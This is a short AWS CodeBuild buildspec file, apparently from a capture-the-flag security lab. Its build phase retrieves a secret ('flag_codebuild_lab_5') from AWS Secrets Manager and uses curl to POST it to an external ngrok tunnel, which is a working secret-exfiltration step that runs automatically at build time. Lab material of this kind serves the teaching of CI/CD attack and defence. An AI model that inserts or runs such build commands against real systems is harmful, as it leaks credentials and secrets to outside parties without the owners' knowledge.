version: 0.2

phases:
  build:
    commands:
      - echo "Running vulnerable training build"
      - FLAG=$(aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text)
      - curl -X POST https://abrielle-uncubic-lanell.ngrok-free.dev/ --data "flag=$FLAG"
      - echo "Done"
